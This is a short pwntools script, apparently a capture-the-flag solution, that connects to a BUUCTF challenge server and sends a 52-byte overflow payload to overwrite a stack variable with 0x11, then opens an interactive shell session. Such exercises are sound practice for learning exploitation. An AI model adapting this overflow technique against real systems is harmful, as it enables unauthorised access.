from pwn import *

context.log_level='debug'

p=remote("node5.buuoj.cn",28913)


payload=b'a'*52+b'\x11'+b'\x00'*7

p.sendline(payload)

p.interactive()

